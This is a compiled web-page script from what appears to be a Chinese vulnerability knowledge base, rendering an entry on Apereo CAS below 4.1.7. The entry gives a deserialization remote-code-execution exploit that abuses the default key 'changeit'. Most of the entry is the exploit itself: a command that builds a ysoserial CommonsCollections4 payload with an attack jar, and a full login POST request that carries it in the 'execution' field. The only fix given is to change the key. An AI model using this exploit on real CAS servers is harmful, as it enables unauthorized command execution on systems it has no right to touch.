(window.webpackJsonp=window.webpackJsonp||[]).push([[79],{786:function(e,a,s){"use strict";s.r(a);var t=s(103),n=Object(t.a)({},(function(){var e=this,a=e.$createElement,s=e._self._c||a;return s("ContentSlotsDistributor",{attrs:{"slot-key":e.$parent.slotKey}},[s("h2",{attrs:{id:"应用简介"}},[e._v("应用简介 "),s("a",{staticClass:"header-anchor",attrs:{href:"#应用简介"}},[e._v("#")])]),e._v(" "),s("p",[e._v("Apereo CAS是一个开源的企业级单点登录系统")]),e._v(" "),s("ul",[s("li",[e._v("一个开放且有据可查的协议")]),e._v(" "),s("li",[e._v("开源Java服务器组件")]),e._v(" "),s("li",[e._v("可插拔身份验证支持（LDAP，数据库，X.509、双因子）")]),e._v(" "),s("li",[e._v("支持多种协议（CAS，SAML，OAuth，OpenID）")]),e._v(" "),s("li",[e._v("Java，.Net，PHP，Perl，Apache，uPortal等客户端的库")]),e._v(" "),s("li",[e._v("与uPortal，BlueSocket，TikiWiki，Mule，Liferay，Moodle等集成")]),e._v(" "),s("li",[e._v("社区文档和实施支持")]),e._v(" "),s("li",[e._v("广泛的采用者社区")])]),e._v(" "),s("h2",{attrs:{id:"默认密钥-4-1-x-反序列化rce"}},[e._v("[默认密钥]-4.1.x 反序列化RCE "),s("a",{staticClass:"header-anchor",attrs:{href:"#默认密钥-4-1-x-反序列化rce"}},[e._v("#")])]),e._v(" "),s("p",[s("strong",[e._v("漏洞概述")])]),e._v(" "),s("div",{staticClass:"language-http line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-http"}},[s("code",[e._v("#影响范围\nApereo-CAS < 4.1.7\n")])]),e._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[e._v("1")]),s("br"),s("span",{staticClass:"line-number"},[e._v("2")]),s("br")])]),s("p",[e._v("其4.1.7版本之前存在一处默认密钥（changeit）的问题，利用这个默认密钥我们可以构造恶意信息触发目标反序列化漏洞，进而执行任意命令")]),e._v(" "),s("p",[s("strong",[e._v("漏洞利用")])]),e._v(" "),s("p",[e._v("1、使用"),s("a",{attrs:{href:"https://github.com/vulhub/Apereo-CAS-Attack",target:"_blank",rel:"noopener noreferrer"}},[e._v("Apereo-CAS-Attack"),s("OutboundLink")],1),e._v("利用，ysoserial的CommonsCollections4生成加密后的Payload")]),e._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[e._v("java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 "),s("span",{pre:!0,attrs:{class:"token string"}},[e._v('"touch /tmp/success"')]),e._v("\n")])]),e._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[e._v("1")]),s("br")])]),s("p",[e._v("2、然后登录CAS并抓包，将Body中的"),s("code",[e._v("execution")]),e._v("值替换成上面生成的Payload")]),e._v(" "),s("div",{staticClass:"language-http line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-http"}},[s("code",[s("span",{pre:!0,attrs:{class:"token request-line"}},[s("span",{pre:!0,attrs:{class:"token property"}},[e._v("POST")]),e._v(" /cas/login HTTP/1.1")]),e._v("\n"),s("span",{pre:!0,attrs:{class:"token header-name keyword"}},[e._v("Host:")]),e._v(" your-ip\n"),s("span",{pre:!0,attrs:{class:"token header-name keyword"}},[e._v("Content-Length:")]),e._v(" 2287\n"),s("span",{pre:!0,attrs:{class:"token header-name keyword"}},[e._v("Cache-Control:")]),e._v(" max-age=0\n"),s("span",{pre:!0,attrs:{class:"token header-name keyword"}},[e._v("Upgrade-Insecure-Requests:")]),e._v(" 1\n"),s("span",{pre:!0,attrs:{class:"token header-name keyword"}},[e._v("Origin:")]),e._v(" http://your-ip:8080\n"),s("span",{pre:!0,attrs:{class:"token header-name keyword"}},[e._v("Content-Type:")]),e._v(" application/x-www-form-urlencoded\n"),s("span",{pre:!0,attrs:{class:"token header-name keyword"}},[e._v("User-Agent:")]),e._v(" Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36\n"),s("span",{pre:!0,attrs:{class:"token header-name keyword"}},[e._v("Accept:")]),e._v(" text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\n"),s("span",{pre:!0,attrs:{class:"token header-name keyword"}},[e._v("Referer:")]),e._v(" http://your-ip:8080/cas/login\n"),s("span",{pre:!0,attrs:{class:"token header-name keyword"}},[e._v("Accept-Encoding:")]),e._v(" gzip, deflate\n"),s("span",{pre:!0,attrs:{class:"token header-name keyword"}},[e._v("Accept-Language:")]),e._v(" en,zh-CN;q=0.9,zh;q=0.8\n"),s("span",{pre:!0,attrs:{class:"token header-name keyword"}},[e._v("Cookie:")]),e._v(" JSESSIONID=24FB4BAAE1A66E8B76D521EE366B3E12; _ga=GA1.1.1139210877.1586367734\n"),s("span",{pre:!0,attrs:{class:"token header-name keyword"}},[e._v("Connection:")]),e._v(" close\n\nusername=test&password=test&lt=LT-2-gs2epe7hUYofoq0gI21Cf6WZqMiJyj-cas01.example.org&execution=[payload]&_eventId=submit&submit=LOGIN\n")])]),e._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[e._v("1")]),s("br"),s("span",{staticClass:"line-number"},[e._v("2")]),s("br"),s("span",{staticClass:"line-number"},[e._v("3")]),s("br"),s("span",{staticClass:"line-number"},[e._v("4")]),s("br"),s("span",{staticClass:"line-number"},[e._v("5")]),s("br"),s("span",{staticClass:"line-number"},[e._v("6")]),s("br"),s("span",{staticClass:"line-number"},[e._v("7")]),s("br"),s("span",{staticClass:"line-number"},[e._v("8")]),s("br"),s("span",{staticClass:"line-number"},[e._v("9")]),s("br"),s("span",{staticClass:"line-number"},[e._v("10")]),s("br"),s("span",{staticClass:"line-number"},[e._v("11")]),s("br"),s("span",{staticClass:"line-number"},[e._v("12")]),s("br"),s("span",{staticClass:"line-number"},[e._v("13")]),s("br"),s("span",{staticClass:"line-number"},[e._v("14")]),s("br"),s("span",{staticClass:"line-number"},[e._v("15")]),s("br"),s("span",{staticClass:"line-number"},[e._v("16")]),s("br")])]),s("p",[s("strong",[e._v("修复建议")])]),e._v(" "),s("p",[e._v("修改默认密钥")])])}),[],!1,null,null,null);a.default=n.exports}}]);